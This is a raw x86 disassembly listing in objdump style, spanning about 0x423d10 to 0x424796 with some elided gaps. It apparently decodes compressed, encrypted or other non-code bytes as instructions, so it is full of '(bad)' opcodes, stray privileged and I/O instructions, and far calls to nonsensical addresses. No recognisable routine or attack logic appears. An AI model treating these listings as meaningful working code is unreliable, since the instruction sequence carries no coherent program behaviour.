  423d10:	test   eax,0x7ae33471
  423d15:	sahf   
  423d16:	js     0x423d3d
  423d18:	sub    cl,BYTE PTR [esi+0x13f1dcd1]
  423d1e:	arpl   WORD PTR [esi+ecx*8],si
  423d21:	and    dl,0xe6
  423d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d25:	pop    esp
  423d26:	inc    esi
  423d27:	lock inc edx
  423d29:	inc    ebx
  423d2a:	hlt    
  423d2b:	out    0x97,eax
  423d2d:	dec    edi
  423d2e:	push   ecx
  423d2f:	enter  0x8d73,0x2c
  423d33:	sub    eax,DWORD PTR [eax+0x0]
	...
  423d95:	add    BYTE PTR [edx-0xa],ah
  423d98:	xchg   DWORD PTR [ecx],ecx
  423d9a:	xchg   edi,eax
  423d9b:	jns    0x423d8b
  423d9d:	dec    edi
  423d9f:	out    0x92,al
  423da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423da2:	sub    DWORD PTR [ecx],edi
  423da4:	inc    ecx
  423da5:	cmp    edx,DWORD PTR [ebx+0x700017d]
  423dab:	add    DWORD PTR [eax],eax
  423dad:	add    BYTE PTR [edi],al
  423daf:	inc    eax
  423db0:	jl     0x423e2d
  423db2:	or     ebp,esp
  423db4:	lahf   
  423db5:	aam    0x66
  423db7:	shl    esi,1
  423db9:	frstor [ecx+0x41]
  423dbc:	pop    ecx
  423dbd:	fs daa 
  423dbf:	push   ebp
  423dc0:	xchg   esi,eax
  423dc1:	xchg   edx,eax
  423dc2:	sub    eax,0x2b26b8c2
  423dc7:	gs push cs
  423dc9:	dec    ebx
  423dca:	dec    ecx
  423dcb:	cdq    
  423dcc:	sub    al,0x94
  423dce:	int    0x16
  423dd0:	ins    BYTE PTR es:[edi],dx
  423dd1:	ja     0x423dc6
  423dd3:	inc    esp
  423dd4:	mov    bh,0x47
  423dd6:	test   edi,ecx
  423dd8:	mov    ds:0xb279a442,al
  423ddd:	xchg   edx,eax
  423dde:	enter  0xa369,0x7d
  423de2:	xchg   ecx,eax
  423de3:	add    DWORD PTR [edx+ebx*2-0x11],edi
  423de7:	add    al,BYTE PTR [edx-0xcf15057]
  423ded:	ins    BYTE PTR es:[edi],dx
  423dee:	ss mov dh,0x9e
  423df1:	aaa    
  423df2:	aam    0x8e
  423df4:	mov    ds:0xaf90a076,eax
  423df9:	leave  
  423dfa:	fcmovnb st,st(5)
  423dfc:	shl    BYTE PTR [ebp+0x6e],cl
  423dff:	hlt    
  423e00:	int    0x10
  423e02:	pop    ebx
  423e03:	enter  0x1918,0xb8
  423e07:	aam    0x5a
  423e09:	rcl    al,1
  423e0b:	add    esi,DWORD PTR [eax-0x27]
  423e0e:	outs   dx,DWORD PTR ds:[esi]
  423e0f:	pop    esi
  423e10:	jae    0x423df3
  423e12:	jns    0x423e07
  423e14:	lock xchg ecx,eax
  423e16:	pop    esp
  423e17:	mov    edi,0x31eaab8c
  423e1c:	sti    
  423e1d:	cmp    dl,dh
  423e1f:	and    edx,DWORD PTR [eax-0x5e62dbc1]
  423e25:	inc    ebp
  423e26:	jno    0x423dc1
  423e28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e29:	jae    0x423dd4
  423e2b:	ins    DWORD PTR es:[edi],dx
  423e2c:	jbe    0x423db3
  423e2e:	ror    ecx,cl
  423e30:	inc    ebp
  423e31:	push   0x256d7cf0
  423e36:	rol    dl,cl
  423e38:	test   DWORD PTR [eax-0x7921b331],eax
  423e3e:	mov    dh,0x91
  423e40:	pushf  
  423e41:	dec    esp
  423e42:	jb     0x423dd8
  423e44:	iret   
  423e45:	push   edx
  423e46:	fimul  WORD PTR [ecx]
  423e48:	icebp  
  423e49:	int3   
  423e4a:	aad    0xa5
  423e4c:	in     al,dx
  423e4d:	or     eax,0xb96fd4a3
  423e52:	ds (bad) 
  423e54:	call   0xfd4d:0xa6c21bb6
  423e5b:	xor    al,0x77
  423e5d:	push   ecx
  423e5e:	inc    ecx
  423e5f:	xor    al,0x95
  423e61:	push   esi
  423e62:	call   0xf4d2:0xfafdf686
  423e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e6a:	add    eax,0x94959f9e
  423e6f:	cmp    ebx,DWORD PTR [esi+0x36]
  423e72:	lahf   
  423e73:	arpl   WORD PTR [edi-0xef41b87],di
  423e79:	xchg   ebp,eax
  423e7a:	push   eax
  423e7b:	mov    ebp,0x57cbdab1
  423e80:	popa   
  423e81:	cli    
  423e82:	fsubp  st(0),st
  423e84:	adc    esp,DWORD PTR [edi+0x20]
  423e87:	sbb    DWORD PTR [esi],eax
  423e89:	xchg   ecx,eax
  423e8a:	mov    DWORD PTR [edi],edi
  423e8c:	mov    dh,0x13
  423e8e:	jo     0x423e32
  423e90:	scas   al,BYTE PTR es:[edi]
  423e91:	cld    
  423e92:	data16 ins BYTE PTR es:[edi],dx
  423e94:	ficomp WORD PTR [ebx-0x38]
  423e97:	retf   0xe823
  423e9a:	mov    bl,0xca
  423e9c:	adc    al,0x54
  423e9e:	es mov ebx,0x73deb867
  423ea4:	das    
  423ea5:	push   es
  423ea6:	push   esi
  423ea7:	pop    eax
  423ea8:	call   0xd902:0xd8c87216
  423eaf:	sub    DWORD PTR [ebp-0x34],esi
  423eb2:	inc    ecx
  423eb3:	sbb    eax,0x60
	...
  423f14:	add    BYTE PTR [eax],al
  423f16:	scas   al,BYTE PTR es:[edi]
  423f17:	call   0x9fff:0xff74b964
  423f1e:	xor    ebp,esi
  423f20:	xchg   BYTE PTR [eax-0xd],dl
  423f23:	aad    0xf3
  423f25:	call   0x43bdc4
  423f2a:	pop    es
  423f2b:	add    DWORD PTR [eax],eax
  423f2d:	add    bh,bl
  423f2f:	push   0xbada30f1
  423f34:	push   edi
  423f35:	das    
  423f36:	bound  esp,QWORD PTR [ebx+eiz*1]
  423f39:	into   
  423f3a:	lea    esp,[ecx+0x2e11e148]
  423f40:	xor    dl,BYTE PTR [eax-0x29c96530]
  423f46:	mov    eax,0x57eefeea
  423f4b:	mov    ebp,0xcd860567
  423f50:	sysret 
  423f52:	xchg   BYTE PTR [edx-0x62],cl
  423f55:	inc    esi
  423f56:	idiv   bh
  423f58:	aas    
  423f59:	mov    esp,0x55b7fa19
  423f5e:	adc    DWORD PTR [ebp+0x4b],edi
  423f61:	xchg   BYTE PTR [ebx+0x7c],ah
  423f64:	out    dx,al
  423f65:	outs   dx,DWORD PTR ds:[esi]
  423f66:	xchg   ebp,eax
  423f67:	mov    esi,0x1cbc8d9a
  423f6c:	imul   esi,DWORD PTR [eax-0x3a],0x43
  423f70:	inc    ebx
  423f71:	or     DWORD PTR [ecx],ebx
  423f73:	aam    0xe8
  423f75:	mov    dl,0xfc
  423f77:	jmp    0x423f62
  423f79:	mov    al,ds:0xec7134dd
  423f7e:	dec    edx
  423f7f:	test   eax,0x2cd3d822
  423f84:	jge    0x423f7a
  423f86:	mov    ah,0xc0
  423f88:	xlat   BYTE PTR ds:[ebx]
  423f89:	jl     0x423f36
  423f8b:	aas    
  423f8c:	inc    ecx
  423f8d:	dec    ebp
  423f8e:	add    eax,0x3b930386
  423f93:	lods   eax,DWORD PTR ds:[esi]
  423f94:	adc    eax,0x3179d6b3
  423f99:	inc    edx
  423f9a:	inc    ebp
  423f9b:	mov    dh,0x37
  423f9d:	clc    
  423f9e:	mov    cl,0x33
  423fa0:	je     0x423ffa
  423fa2:	arpl   WORD PTR [ecx+ebx*8],sp
  423fa5:	mov    esp,0xe266d7f5
  423faa:	jb     0x424008
  423fac:	add    esp,esp
  423fae:	sub    eax,0xd962bece
  423fb3:	shl    BYTE PTR [ecx-0x31],1
  423fb6:	and    ecx,eax
  423fb8:	rol    BYTE PTR ds:0xa1c5b463,0xda
  423fbf:	mov    eax,0x2cdf7692
  423fc4:	sub    al,0x12
  423fc6:	push   ebp
  423fc7:	and    edi,DWORD PTR [ebx]
  423fc9:	dec    ebx
  423fca:	test   BYTE PTR [ecx-0x33b4e96f],dh
  423fd0:	test   DWORD PTR [ecx+0x13bc14b6],0x1aa74e89
  423fda:	push   0x43
  423fdc:	fld    st(3)
  423fde:	imul   eax,DWORD PTR [edi-0x671b9558],0x6f375cdf
  423fe8:	jmp    0x973568f0
  423fed:	push   ebp
  423fee:	xor    eax,0x4f16aa0
  423ff3:	jo     0x42402c
  423ff5:	push   0xffffffd4
  423ff7:	fwait
  423ff8:	rcl    eax,0x60
  423ffb:	push   0x5f5c3903
  424000:	and    al,0xfc
  424002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424003:	out    dx,al
  424004:	xchg   ebp,eax
  424005:	cmp    BYTE PTR [ecx],0xb6
  424008:	ret    0x5fe
  42400b:	mov    eax,0xd2341430
  424010:	sub    dl,BYTE PTR [ecx+eax*1+0x64]
  424014:	fwait
  424015:	or     DWORD PTR [ecx],ecx
  424017:	call   0x82f4:0x15cf28de
  42401e:	imul   esp,DWORD PTR [esi+0x38dae25e],0xcdcf3ac7
  424028:	gs das 
  42402a:	mov    dl,0x5
  42402c:	and    ebx,DWORD PTR [edi+ebx*8+0x1]
  424030:	lahf   
  424031:	push   ebx
  424032:	mov    al,0x75
  424034:	aaa    
	...
  424095:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424099:	mov    cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi-0x455e30f]
  4240a3:	inc    esi
  4240a4:	shl    BYTE PTR [edx],cl
  4240a6:	mov    eax,ds:0x700017f
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    BYTE PTR [edx+ecx*8+0x75],bh
  4240b1:	mov    WORD PTR [esi-0x464651bd],?
  4240b7:	push   eax
  4240b8:	mov    edi,0x6b91b61
  4240bd:	push   ebx
  4240be:	xchg   ebx,eax
  4240bf:	inc    ebx
  4240c0:	ss cmc 
  4240c2:	pop    esi
  4240c3:	inc    ebx
  4240c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240c5:	imul   edx,edi,0x7c
  4240c8:	mov    eax,0xc538f89d
  4240cd:	addr16 mov esi,0x375fcb04
  4240d3:	(bad)  
  4240d4:	cld    
  4240d5:	(bad)  
  4240d6:	mov    esi,0x15096285
  4240db:	out    dx,eax
  4240dc:	adc    bh,ah
  4240de:	and    bl,bl
  4240e0:	(bad)  
  4240e1:	daa    
  4240e2:	push   ebp
  4240e3:	pop    edi
  4240e4:	inc    DWORD PTR [eax+0x44]
  4240e7:	pop    edx
  4240e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240e9:	dec    ebp
  4240ea:	pop    edx
  4240eb:	repnz icebp 
  4240ed:	std    
  4240ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240ef:	xchg   edi,eax
  4240f0:	cmp    BYTE PTR [esi+0x4295663e],ah
  4240f6:	(bad)  
  4240f7:	and    BYTE PTR [ebx+0x0],dl
  4240fa:	pusha  
  4240fb:	push   ecx
  4240fc:	push   cs
  4240fd:	push   edi
  4240fe:	xor    al,0xae
  424100:	mov    dl,0xb3
  424102:	cmp    ebx,DWORD PTR [ebx-0x1c]
  424105:	cs push edx
  424107:	sub    ecx,DWORD PTR [esi+edx*8-0x36229f53]
  42410e:	cmp    ebp,DWORD PTR [edi+0x3a]
  424111:	sbb    al,0xe0
  424113:	adc    eax,0x7f1f39b7
  424118:	js     0x4240fa
  42411a:	adc    dl,ch
  42411c:	xor    eax,0xdb7d294c
  424121:	cmp    al,0x58
  424123:	sar    ch,1
  424125:	mov    WORD PTR ds:0x63c48902,?
  42412b:	push   ebp
  42412c:	lock call 0x65753a82
  424132:	or     al,0xf0
  424134:	sbb    ah,BYTE PTR [ecx]
  424136:	and    eax,0x38ca7ee
  42413b:	into   
  42413c:	and    DWORD PTR [ecx+eax*8+0x646373f6],edi
  424143:	lea    ebx,[ecx-0x4f6345f8]
  424149:	aaa    
  42414a:	sub    DWORD PTR [esi-0x62],eax
  42414d:	push   esi
  42414e:	pop    edx
  42414f:	retf   0x6a6b
  424152:	retf   0x3b3a
  424155:	jne    0x424154
  424157:	fs das 
  424159:	repz xchg esp,eax
  42415b:	dec    ebx
  42415c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42415d:	leave  
  42415e:	iret   
  42415f:	add    bh,BYTE PTR [ebx+0x4f212e05]
  424165:	mov    eax,0xbe6a8efb
  42416a:	lods   eax,DWORD PTR ds:[esi]
  42416b:	inc    DWORD PTR [ebx+0x646cad6a]
  424171:	adc    al,0xb5
  424173:	and    eax,0x80938b83
  424178:	mov    BYTE PTR [edx-0xf],dl
  42417b:	xchg   esp,eax
  42417c:	lahf   
  42417d:	push   ds
  42417e:	jno    0x4241f3
  424180:	jmp    0xab538c79
  424185:	jmp    0x3477:0x3f6caca8
  42418c:	(bad)  
  42418d:	jae    0x4241f2
  42418f:	inc    edx
  424190:	sbb    al,al
  424192:	ret    0x74ff
  424195:	push   esi
  424196:	push   esp
  424197:	jg     0x4241e6
  424199:	mov    ebx,0xe009ed8d
  42419e:	sub    edi,ebp
  4241a0:	pop    ds
  4241a1:	or     dh,BYTE PTR [esi]
  4241a3:	sub    DWORD PTR [edi-0x51],eax
  4241a6:	pop    es
  4241a7:	cli    
  4241a8:	xor    al,0x37
  4241aa:	(bad)  
  4241ab:	fsub   DWORD PTR [ecx]
  4241ad:	lds    ebp,FWORD PTR [edi+0x21]
  4241b0:	cmc    
  4241b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241b2:	jl     0x42416b
  4241b4:	fiadd  WORD PTR [eax]
	...
  424216:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42421d:	call   DWORD PTR [edi+0x5bd4b417]
  424223:	lahf   
  424224:	pop    ecx
  424225:	inc    edi
  424226:	test   al,0x80
  424228:	add    DWORD PTR [eax],eax
  42422a:	pop    es
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    cl,ch
  42422f:	push   eax
  424230:	jmp    0xdcd9efe6
  424235:	iret   
  424236:	or     BYTE PTR ds:0xa7505505,ah
  42423c:	lock mov ch,0x26
  42423f:	stos   DWORD PTR es:[edi],eax
  424240:	add    eax,DWORD PTR [ecx-0x65]
  424243:	lea    ebp,[ecx+0x2c]
  424246:	jae    0x424247
  424248:	leave  
  424249:	jno    0x42423b
  42424b:	mov    eax,ds:0x8fe93662
  424250:	ficomp DWORD PTR [ecx+ebp*1-0x2ad1517]
  424257:	imul   edx,DWORD PTR [ecx],0xdaf9c3c3
  42425d:	mov    fs,WORD PTR [ecx-0x8]
  424260:	(bad)  
  424261:	or     BYTE PTR [eax],al
  424263:	dec    ebp
  424264:	mov    es,WORD PTR [edi-0xe880dfb]
  42426a:	and    bl,bl
  42426c:	in     al,dx
  42426d:	cmp    edx,esp
  42426f:	xor    edi,DWORD PTR [edx+0x3a]
  424272:	jle    0x4242bd
  424274:	xor    BYTE PTR [ecx-0x53],bl
  424277:	fs enter 0xa6fe,0xa9
  42427c:	out    dx,eax
  42427d:	and    dh,ah
  42427f:	and    esp,ecx
  424281:	test   eax,0xdc1523c1
  424286:	bound  esp,QWORD PTR [eax+0x61]
  424289:	jb     0x424266
  42428b:	dec    esp
  42428c:	inc    edx
  42428d:	fstp   TBYTE PTR [edx]
  42428f:	or     BYTE PTR ds:0x8bb3985,dh
  424295:	mov    dl,0xb4
  424297:	std    
  424298:	(bad)  
  424299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42429a:	add    edx,DWORD PTR [ecx-0x63]
  42429d:	jbe    0x424279
  42429f:	jecxz  0x4242bf
  4242a1:	pop    ebp
  4242a2:	pushf  
  4242a3:	mov    eax,0x4be28449
  4242a8:	cmp    eax,0x611db5e8
  4242ad:	mov    esi,0xd471f71c
  4242b2:	push   0x382c1e12
  4242b7:	xchg   BYTE PTR [edi+eiz*1],bh
  4242ba:	stos   DWORD PTR es:[edi],eax
  4242bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242bc:	add    ebx,DWORD PTR [esi]
  4242be:	push   ds
  4242bf:	bound  ebp,QWORD PTR [ecx+0xdd0e49a]
  4242c5:	push   0xebe3b8d2
  4242ca:	(bad)  
  4242cb:	(bad)  
  4242cc:	in     al,0xe3
  4242ce:	xor    eax,0x802c91fd
  4242d3:	push   DWORD PTR [ecx-0x6ca6f35d]
  4242d9:	xchg   ebp,eax
  4242da:	xor    al,0xab
  4242dc:	rol    BYTE PTR [edi],cl
  4242de:	les    ebp,FWORD PTR [edi+0x3fb0cce7]
  4242e4:	ds imul edi,esi,0xee5bc4d6
  4242eb:	mov    dh,0xcd
  4242ed:	jb     0x4242e1
  4242ef:	shr    BYTE PTR [ebp-0x3c],1
  4242f2:	cmc    
  4242f3:	ss dec esi
  4242f5:	mov    ch,0x71
  4242f7:	xchg   edi,eax
  4242f8:	mov    esi,0xa7aac9a0
  4242fd:	inc    esi
  4242fe:	das    
  4242ff:	mov    esp,0xef4212d5
  424304:	scas   eax,DWORD PTR es:[edi]
  424305:	mov    edx,0xb064dc32
  42430a:	ds pop esi
  42430c:	lea    ebp,[bp+si]
  42430f:	adc    eax,0x3d539651
  424314:	xchg   esp,eax
  424315:	and    eax,DWORD PTR [edi+0x186ce499]
  42431b:	retf   
  42431c:	outs   dx,BYTE PTR ds:[esi]
  42431d:	mov    esi,0x54494c4d
  424322:	push   0xd85cf8e1
  424327:	(bad)  
  424328:	fdivr  DWORD PTR [edx+0x18bee7be]
  42432e:	(bad)  
  42432f:	mov    DWORD PTR [edi],ecx
  424331:	imul   ebp,DWORD PTR [ebx-0x6f],0xffffffad
	...
  424395:	add    BYTE PTR [edx-0x24582da],cl
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	jle    0x4243ab
  4243a4:	dec    edx
  4243a5:	aad    0xaf
  4243a7:	add    DWORD PTR [ecx],0x10700
  4243ad:	add    al,bl
  4243af:	cs cdq 
  4243b1:	sub    ecx,DWORD PTR [ebp-0x50]
  4243b4:	sti    
  4243b5:	push   ebx
  4243b6:	sar    DWORD PTR [esi],0x7b
  4243b9:	lods   al,BYTE PTR ds:[esi]
  4243ba:	or     eax,0xaa30f694
  4243bf:	test   eax,0xae264aa4
  4243c4:	adc    DWORD PTR ds:0x22d541ec,ebp
  4243ca:	cli    
  4243cb:	ins    DWORD PTR es:[edi],dx
  4243cc:	xor    ch,dl
  4243ce:	(bad)  
  4243cf:	cmp    bl,ah
  4243d1:	cmp    eax,edx
  4243d3:	out    0x3b,al
  4243d5:	int    0xfe
  4243d7:	iret   
  4243d8:	inc    esi
  4243d9:	and    dl,BYTE PTR [edi+0x17]
  4243dc:	lods   eax,DWORD PTR ds:[esi]
  4243dd:	jle    0x42436d
  4243df:	xchg   BYTE PTR [edx+0x7897976],bh
  4243e5:	(bad)  
  4243e6:	mov    edi,0x53157933
  4243eb:	out    0xb,eax
  4243ed:	mov    dh,0x2
  4243ef:	inc    BYTE PTR [eax]
  4243f1:	arpl   bp,bx
  4243f3:	fcomp  QWORD PTR [esi+eiz*4+0x634fe883]
  4243fa:	out    dx,eax
  4243fb:	scas   al,BYTE PTR es:[edi]
  4243fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243fd:	mov    ebp,0x5f86f3a6
  424402:	out    0x4d,eax
  424404:	repz jmp 0x4243cf
  424407:	add    eax,0x1db98fb5
  42440c:	outs   dx,BYTE PTR ds:[esi]
  42440d:	sbb    al,BYTE PTR [eax-0xe]
  424410:	dec    ebp
  424411:	mov    bh,0xfb
  424413:	fistp  DWORD PTR [eax-0x77]
  424416:	rcr    DWORD PTR [ecx],1
  424418:	arpl   bp,sp
  42441a:	in     eax,dx
  42441b:	jno    0x4243f7
  42441d:	repz mov edi,esp
  424420:	mov    ch,0xc
  424422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424423:	ss in  al,0x8b
  424426:	ret    
  424427:	ss jbe 0x424415
  42442a:	xchg   DWORD PTR [edx],esi
  42442c:	stc    
  42442d:	mov    ah,0xc7
  42442f:	frstor [ebx*1+0x517fd313]
  424436:	(bad)  
  424437:	stos   DWORD PTR es:[edi],eax
  424438:	popa   
  424439:	rol    BYTE PTR [eax+esi*4-0x5cc91c76],0xb5
  424441:	mov    ds:0xf4aa5daa,eax
  424446:	(bad)  [eax]
  424448:	inc    esi
  424449:	gs test eax,0x648f5314
  42444f:	stc    
  424450:	add    cl,BYTE PTR [ebp-0x2fe008ba]
  424456:	and    DWORD PTR [ebx],0xffffffd0
  424459:	dec    ebp
  42445a:	dec    ebx
  42445b:	adc    eax,0xf2914da1
  424460:	push   0xffffffa3
  424462:	add    esp,esp
  424464:	add    BYTE PTR [esi+edi*8-0x9],0x3c
  424469:	ror    BYTE PTR [eax],0xa
  42446c:	stos   DWORD PTR es:[edi],eax
  42446d:	mov    ebx,0x4dafa13a
  424472:	clc    
  424473:	pop    ds
  424474:	dec    ebp
  424475:	and    DWORD PTR [edi-0x27],edx
  424478:	adc    eax,esp
  42447a:	cwde   
  42447b:	aaa    
  42447c:	add    dl,ah
  42447e:	in     al,dx
  42447f:	aad    0x55
  424481:	jle    0x42444f
  424483:	in     eax,0x8e
  424485:	mov    edx,0x9b9b6d7e
  42448a:	pop    ebp
  42448b:	scas   eax,DWORD PTR es:[edi]
  42448c:	mov    bh,0x2
  42448e:	add    al,0xf1
  424490:	jp     0x424490
  424492:	pop    ds
  424493:	ja     0x4244c5
  424495:	adc    dl,BYTE PTR ds:[ecx+0x57]
  424499:	fbld   TBYTE PTR [esi+0x2a479269]
  42449f:	fstp   TBYTE PTR [ebp+0x11]
  4244a2:	mov    esi,?
  4244a4:	or     ebx,edi
  4244a6:	adc    eax,0x483d8bdc
  4244ab:	mov    BYTE PTR [esi+0x65],dl
  4244ae:	jne    0x424500
  4244b0:	cmp    al,ch
  4244b2:	vpsrlq ymm0,ymm6,XMMWORD PTR [eax]
	...
  424516:	loopne 0x424587
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0x760ff3ab
  424523:	jg     0x4244cf
  424525:	popf   
  424526:	mov    dh,0x82
  424528:	add    DWORD PTR [eax],eax
  42452a:	pop    es
  42452b:	add    DWORD PTR [eax],eax
  42452d:	add    BYTE PTR [esi],ch
  42452f:	dec    edi
  424530:	mov    bl,0x67
  424532:	out    0xe3,al
  424534:	lds    edi,FWORD PTR ds:0x76e29058
  42453a:	sti    
  42453b:	pushf  
  42453c:	sbb    esp,edi
  42453e:	out    dx,al
  42453f:	or     ah,dh
  424541:	inc    ecx
  424542:	int3   
  424543:	stos   BYTE PTR es:[edi],al
  424544:	dec    ebp
  424545:	pop    ebp
  424546:	jmp    0xd14c:0x25aab399
  42454d:	adc    BYTE PTR [ebp-0x4bd4eea],bh
  424553:	test   DWORD PTR [ebx+0x117cf605],ecx
  424559:	into   
  42455a:	hlt    
  42455b:	les    ebp,FWORD PTR [eax-0x5a44219d]
  424561:	imul   edi,DWORD PTR [esp+ebp*2+0x5c],0x5d2589df
  424569:	mov    bl,0xd9
  42456b:	xlat   BYTE PTR ds:[ebx]
  42456c:	inc    eax
  42456d:	jg     0x4245cb
  42456f:	mov    edi,0x4f5f79a1
  424574:	and    edi,esp
  424576:	in     al,0x2b
  424578:	gs xor eax,0x359d06bd
  42457e:	pop    eax
  42457f:	xor    al,0x75
  424581:	ja     0x4245e8
  424583:	xchg   DWORD PTR [ecx-0x6370b525],edi
  424589:	mov    al,0x38
  42458b:	shr    dh,0x80
  42458e:	xchg   ebx,eax
  42458f:	in     al,dx
  424590:	jge    0x4245d5
  424592:	push   0x64
  424594:	mov    ds:0x7f4aefcd,eax
  424599:	test   eax,0xe94656a7
  42459e:	add    eax,0x2b96de78
  4245a3:	mov    dl,0x3a
  4245a5:	push   ebx
  4245a6:	into   
  4245a7:	inc    ecx
  4245a8:	mov    edx,0x64756b99
  4245ad:	sbb    eax,0xfc813c76
  4245b2:	shr    BYTE PTR [ebx+ebp*2],0x98
  4245b6:	repnz push 0x1a6473d6
  4245bc:	(bad)  
  4245bd:	cmp    eax,0xd14b01ed
  4245c2:	sbb    al,0x30
  4245c4:	push   esi
  4245c5:	or     dl,bl
  4245c7:	cld    
  4245c8:	ss mov bl,0x7
  4245cb:	sub    al,0x5a
  4245cd:	sub    cl,ch
  4245cf:	test   BYTE PTR [ecx-0x36],bh
  4245d2:	popf   
  4245d3:	std    
  4245d4:	lds    ecx,FWORD PTR [eax-0x6528d3cb]
  4245da:	mov    esp,0x57bd763f
  4245df:	fcomp  DWORD PTR [edx-0x6]
  4245e2:	(bad)  
  4245e4:	jecxz  0x424571
  4245e6:	ss enter 0x826c,0x63
  4245eb:	retf   
  4245ec:	addr16 and al,0xe9
  4245ef:	pop    eax
  4245f1:	fcmovnb st,st(6)
  4245f3:	mov    ebx,0xc9de2202
  4245f8:	(bad)  
  4245f9:	or     bl,BYTE PTR [ecx-0x6aabe2ff]
  4245ff:	lahf   
  424600:	xchg   ecx,eax
  424601:	mov    edx,DWORD PTR [edx-0x6d]
  424604:	push   ebx
  424605:	xlat   BYTE PTR ds:[ebx]
  424606:	pop    eax
  424607:	test   BYTE PTR [ecx],0xf4
  42460a:	push   ebx
  42460c:	xor    BYTE PTR [ebp+0x198819b7],ch
  424612:	mov    eax,0xc3b3c3c9
  424617:	scas   al,BYTE PTR es:[edi]
  424618:	shr    BYTE PTR [edx+0x7245ac46],cl
  42461e:	fwait
  42461f:	(bad)  
  424620:	cmc    
  424621:	scas   eax,DWORD PTR es:[edi]
  424622:	or     BYTE PTR [esi-0x7624eba4],dh
  424628:	pop    eax
  424629:	and    al,0x12
  42462b:	sub    al,0x1e
  42462d:	sbb    esp,DWORD PTR [edi]
  42462f:	jl     0x424603
  424631:	add    al,0x26
  424633:	imul   esi,edi,0x0
	...
  424696:	mov    esp,0xfefffc92
  42469b:	(bad)  
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    ebx,esp
  4246a3:	sub    ecx,DWORD PTR [edi+0x183bd5c]
  4246a9:	add    BYTE PTR [edi],al
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    cl,al
  4246af:	push   cs
  4246b0:	lahf   
  4246b1:	cs jmp 0x424666
  4246b4:	dec    esi
  4246b5:	dec    edx
  4246b6:	jp     0x4246e8
  4246b8:	push   ecx
  4246b9:	add    DWORD PTR [edi+esi*4],ebp
  4246bc:	or     eax,0x53ad6efa
  4246c1:	fcmovnu st,st(3)
  4246c3:	hlt    
  4246c4:	pusha  
  4246c5:	fdiv   QWORD PTR [esp+eax*2]
  4246c8:	xchg   esi,eax
  4246c9:	sbb    al,0x8e
  4246cb:	nop
  4246cc:	cmp    dh,BYTE PTR [edx]
  4246ce:	add    DWORD PTR [ebp+0x15845b2],esp
  4246d4:	dec    edx
  4246d5:	sub    ecx,DWORD PTR [ebx]
  4246d7:	jmp    0xc1009735
  4246dc:	lock loop 0x424738
  4246df:	cwde   
  4246e0:	and    ah,al
  4246e2:	inc    ebx
  4246e3:	mov    ecx,0x2c830c86
  4246e8:	out    dx,eax
  4246e9:	enter  0xd6a2,0x44
  4246ed:	test   ax,0x1bc5
  4246f1:	push   ecx
  4246f2:	cwde   
  4246f3:	leave  
  4246f4:	add    BYTE PTR es:[eax],al
  4246f7:	or     dl,BYTE PTR [ecx]
  4246f9:	mov    bh,0xb3
  4246fb:	xor    eax,DWORD PTR [ebx-0x2ad5e082]
  424701:	fimul  WORD PTR [edx]
  424703:	mov    ecx,ecx
  424705:	test   DWORD PTR [ebp-0x69],esp
  424708:	call   0x5e1552c
  42470d:	mov    dh,0xc1
  42470f:	les    ebp,FWORD PTR es:[eax-0x2c]
  424713:	scas   al,BYTE PTR es:[edi]
  424714:	xchg   ebp,eax
  424715:	pushf  
  424716:	mov    DWORD PTR [eax],edi
  424718:	leave  
  424719:	in     eax,dx
  42471a:	stos   BYTE PTR es:[edi],al
  42471b:	lods   al,BYTE PTR ss:[esi]
  42471d:	mov    al,0xc6
  42471f:	cmp    BYTE PTR [edi],dh
  424721:	out    dx,eax
  424722:	out    dx,eax
  424723:	jmp    0x65d6b649
  424728:	pop    edx
  424729:	(bad)  
  42472a:	jmp    0xe581:0x3cc8e95d
  424731:	adc    BYTE PTR [esi+0x2a5ee444],ch
  424737:	or     eax,DWORD PTR [eax+0x17]
  42473a:	sbb    BYTE PTR ds:0x17e028c1,bh
  424740:	cmc    
  424741:	sahf   
  424742:	pop    edi
  424743:	out    0x6d,al
  424745:	out    dx,eax
  424746:	loopne 0x4247b0
  424748:	div    eax
  42474a:	sub    BYTE PTR [ecx],0xc4
  42474d:	mov    bh,0xf8
  42474f:	(bad)  
  424750:	jecxz  0x42476a
  424752:	mov    ds:0xe66792cd,eax
  424757:	sbb    BYTE PTR [esi-0x25],cl
  42475a:	jno    0x42473a
  42475c:	xor    al,0xe2
  42475e:	sub    DWORD PTR [esi+0x1e9e8484],ecx
  424764:	pop    ds
  424765:	push   edx
  424766:	adc    eax,0x24f7841
  42476b:	repnz out 0x9c,al
  42476e:	fwait
  42476f:	arpl   WORD PTR [eax-0x20ce3c7c],cx
  424775:	ja     0x4247d1
  424777:	gs ret 0x7b1e
  42477b:	jno    0x4247f7
  42477d:	jb     0x4247ed
  42477f:	repz or DWORD PTR [edi],esp
  424782:	jo     0x424742
  424784:	mov    ebx,0x4b838a2e
  424789:	pop    ebx
  42478a:	adc    BYTE PTR [edi],ah
  42478c:	jp     0x424749
  42478e:	and    eax,0xc5293faa
  424793:	rcr    DWORD PTR [ecx],0x3f
  424796:	push   0x3080aeb8
